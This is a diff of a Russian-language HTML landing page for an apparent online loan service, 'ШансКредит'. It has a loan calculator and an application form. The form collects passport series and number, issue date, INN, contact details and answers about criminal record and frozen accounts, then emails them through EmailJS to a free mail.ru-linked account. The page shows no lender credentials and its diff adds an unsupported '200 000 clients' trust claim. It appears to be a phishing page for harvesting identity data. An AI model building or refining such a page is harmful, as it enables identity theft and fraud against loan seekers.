@@ -3,127 +3,46 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>ШансКредит</title>
+    <title>ШансКредит — онлайн заявка</title>
+    <meta name="description" content="Оформите онлайн-заявку на кредит до 300 000 ₽ под выгодный процент. Быстрое рассмотрение, без визита в офис!">
+    <meta name="keywords" content="кредит, онлайн кредит, быстрый займ, деньги на карту, заявка на кредит">
     <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/6942/6942962.png" type="image/png">
     <style>
-        body {
-            margin: 0;
-            font-family: Arial, sans-serif;
-            background: #f5f8fb;
-            color: #111;
-        }
-        header {
-            background: #0066cc;
-            color: white;
-            padding: 20px;
-            text-align: center;
-            font-size: 28px;
-            font-weight: bold;
-        }
-        .container {
-            max-width: 600px;
-            margin: 40px auto;
-            background: white;
-            border-radius: 16px;
-            padding: 24px;
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
-        }
-        h2 {
-            color: #0066cc;
-            text-align: center;
-        }
-        input, select, textarea {
-            width: 100%;
-            padding: 12px;
-            font-size: 16px;
-            border: 1px solid #ccc;
-            border-radius: 8px;
-            margin-bottom: 12px;
-            box-sizing: border-box;
-        }
-        .result-box {
-            background: #e6f0ff;
-            padding: 12px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-        }
-        button {
-            padding: 14px;
-            width: 100%;
-            background: #0066cc;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        button:hover {
-            background: #004f99;
-        }
-        .footer {
-            text-align: center;
-            font-size: 14px;
-            color: #666;
-            margin-top: 40px;
-            padding-bottom: 20px;
-        }
-
-        #toast {
-            display: none;
-            position: fixed;
-            top: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #d1e7dd;
-            color: #0f5132;
-            border: 1px solid #badbcc;
-            padding: 16px 24px;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
-            font-size: 16px;
-            z-index: 9999;
-            animation: fadeInSlideDown 0.5s ease-out;
-        }
-        #toast span {
-            margin-left: 20px;
-            cursor: pointer;
-        }
-
+        body { margin: 0; font-family: Arial, sans-serif; background: #f6f9fc; color: #222; }
+        header { background: #5528d2; color: white; text-align: center; padding: 24px 16px; font-size: 24px; font-weight: bold; }
+        .container { max-width: 600px; margin: 32px auto; background: white; border-radius: 16px; padding: 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
+        h2 { color: #5528d2; text-align: center; }
+        label { font-weight: bold; display: block; margin-bottom: 6px; }
+        input, select, textarea { width: 100%; padding: 12px; margin-bottom: 16px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; }
+        button { width: 100%; background: #5528d2; color: white; border: none; padding: 14px; font-size: 16px; border-radius: 8px; cursor: pointer; }
+        button:hover { background: #3f1da8; }
+        .result-box { background: #ede7fd; padding: 16px; border-radius: 8px; margin-bottom: 24px; }
+        .steps { background: #faf8ff; border-radius: 16px; padding: 16px; margin-top: 40px; }
+        .step { margin-bottom: 16px; font-size: 16px; }
+        .trust { text-align: center; margin: 0 auto; font-size: 18px; color: white; padding: 16px; background: #888888;width: 70%}
+        .footer { text-align: center; font-size: 14px; color: #888; padding: 40px 20px 20px; }
+        #toast { display: none; position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #d1e7dd; color: #0f5132; padding: 16px 20px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.2); z-index: 9999; font-size: 16px; animation: fadeInSlideDown 0.4s ease-out; }
+        #toast span { float: right; cursor: pointer; margin-left: 12px; }
         @keyframes fadeInSlideDown {
-            from {
-                opacity: 0;
-                transform: translate(-50%, -20px);
-            }
-            to {
-                opacity: 1;
-                transform: translate(-50%, 0);
-            }
-        }
-
-        @media (max-width: 600px) {
-            .container {
-                margin: 20px;
-                padding: 16px;
-            }
-            header {
-                font-size: 22px;
-                padding: 16px;
-            }
+            from { opacity: 0; transform: translate(-50%, -20px); }
+            to { opacity: 1; transform: translate(-50%, 0); }
         }
     </style>
 </head>
 <body>
 <header>ШансКредит — быстрые финансовые решения</header>
 
+<div id="toast">✅ Заявка отправлена! Мы свяжемся с вами в течение часа.<br>💳 В случае одобрения потребуется карта на ваше имя.<span onclick="document.getElementById('toast').style.display='none'">✖</span></div>
+
 <div class="container">
     <h2>💰 Кредитный калькулятор</h2>
     <label>Сумма кредита (до 300 000 ₽):</label>
     <input type="range" id="amount" min="1000" max="300000" step="1000" value="10000" oninput="calculate()">
-    <div>Сумма: <span id="amountVal">10000</span> ₽</div>
+    <div>Вы выбрали: <strong><span id="amountVal">10000</span> ₽</strong></div>
 
-    <label>Срок кредита (до 61 дня):</label>
+    <label>Срок (до 61 дня):</label>
     <input type="range" id="days" min="1" max="61" step="1" value="30" oninput="calculate()">
-    <div>Срок: <span id="daysVal">30</span> дней</div>
+    <div>Срок: <strong><span id="daysVal">30</span> дней</strong></div>
 
     <div class="result-box">
         <p>Основная сумма: <strong><span id="base">10000</span> ₽</strong></p>
@@ -131,67 +50,60 @@
         <p>К оплате: <strong><span id="total">10600</span> ₽</strong></p>
     </div>
 
-    <button onclick="document.getElementById('form-block').scrollIntoView({ behavior: 'smooth' })">Оформить заявку</button>
+    <button onclick="document.getElementById('form').scrollIntoView({ behavior: 'smooth' })">Оформить заявку</button>
 </div>
 
-<div class="container" id="form-block">
-    <h2>📨 Заявка на кредит</h2>
+<div class="container steps">
+    <h2>Как получить кредит онлайн</h2>
+    <div class="step">1. Выберите сумму и срок кредита</div>
+    <div class="step">2. Заполните простую анкету</div>
+    <div class="step">3. Подтвердите заявку и подпишите договор через смс</div>
+    <div class="step">4. Получите деньги на карту</div>
+</div>
+
+<div class="trust">
+    Нам доверяют более 200 000 клиентов по всей России — 24/7 онлайн поддержка и безопасность данных.
+</div>
+
+<div class="container" id="form">
+    <h2>📨 Заполните анкету</h2>
     <form id="credit-form">
         <input type="text" name="lastname" placeholder="Фамилия" required />
         <input type="text" name="firstname" placeholder="Имя" required />
         <input type="text" name="middlename" placeholder="Отчество" required />
-        <input type="text" name="snils" placeholder="СНИЛС (XXX-XXX-XXX XX)" required />
         <input type="tel" name="phone" placeholder="Телефон" required />
+        <input type="email" name="email" placeholder="Email" required />
         <input type="text" name="city" placeholder="Город" required />
-        <input type="text" name="income" placeholder="Доход / Занятость" required />
-        <input type="email" name="email" placeholder="E-mail" required />
         <input type="text" name="passport" placeholder="Серия и номер паспорта" required />
-        <p>Дата выдачи паспорта:</p>
-        <input type="date" name="passport_date" title="Дата выдачи паспорта" required />
+        <input type="date" name="passport_date" placeholder="Дата выдачи паспорта" required title="Дата выдачи паспорта" />
         <input type="text" name="tax_id" placeholder="ИНН / Идентификационный код" required />
-
-        <label>Есть ли судимость?</label>
         <select name="criminal_record" required>
-            <option value="">Выберите ответ</option>
+            <option value="">Есть ли судимость?</option>
             <option value="Да">Да</option>
             <option value="Нет">Нет</option>
         </select>
-
-        <label>Есть ли действующие кредиты?</label>
         <select name="active_loans" required>
-            <option value="">Выберите ответ</option>
+            <option value="">Есть ли кредиты?</option>
             <option value="Да">Да</option>
             <option value="Нет">Нет</option>
         </select>
-
-        <label>Арестованы ли счета?</label>
         <select name="accounts_frozen" required>
-            <option value="">Выберите ответ</option>
+            <option value="">Арестованы ли счета?</option>
             <option value="Да">Да</option>
             <option value="Нет">Нет</option>
         </select>
-
         <textarea name="comment" rows="4" placeholder="Комментарий (необязательно)"></textarea>
-
-        <input type="hidden" name="amount" id="hiddenAmount" />
-        <input type="hidden" name="term" id="hiddenTerm" />
-        <input type="hidden" name="base" id="hiddenBase" />
-        <input type="hidden" name="interest" id="hiddenInterest" />
-        <input type="hidden" name="total" id="hiddenTotal" />
-
+        <input type="hidden" name="amount" id="hiddenAmount">
+        <input type="hidden" name="term" id="hiddenTerm">
+        <input type="hidden" name="base" id="hiddenBase">
+        <input type="hidden" name="interest" id="hiddenInterest">
+        <input type="hidden" name="total" id="hiddenTotal">
         <button type="submit">Отправить заявку</button>
     </form>
 </div>
 
-<div id="toast">
-    ✅ Ваша заявка отправлена! Мы свяжемся с вами в течение часа.<br />
-    💳 В случае одобрения необходимо будет предоставить банковскую карту, оформленную на ваше имя.
-    <span onclick="document.getElementById('toast').style.display='none'">✖</span>
-</div>
-
 <div class="footer">
-    © 2025 ШансКредит<br>
-    Контакты: shanscredit@mail.ru · +7 (900) 123-45-67
+    © 2025 ШансКредит · Контакты: shanscredit@mail.ru · +7 (900) 123-45-67
 </div>
 
 <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
@@ -204,8 +116,8 @@
     function calculate() {
         const amount = +document.getElementById("amount").value;
         const days = +document.getElementById("days").value;
-        const ratePerDay = 0.002;
-        const percents = Math.round(amount * ratePerDay * days);
+        const rate = 0.002;
+        const percents = Math.round(amount * rate * days);
         const totalSum = amount + percents;
 
         document.getElementById("amountVal").textContent = amount;
@@ -223,7 +135,7 @@
 
     window.onload = calculate;
 
-    form.addEventListener("submit", function (e) {
+    form.addEventListener("submit", function(e) {
         e.preventDefault();
         calculate();
         emailjs.sendForm("service_ozen", "template_tzy51bm", form)
@@ -234,7 +146,7 @@
                 window.scrollTo({ top: 0, behavior: "smooth" });
             })
             .catch(() => {
-                alert("❌ Ошибка при отправке. Попробуйте позже.");
+                alert("Ошибка при отправке заявки. Попробуйте позже.");
             });
     });
 </script>
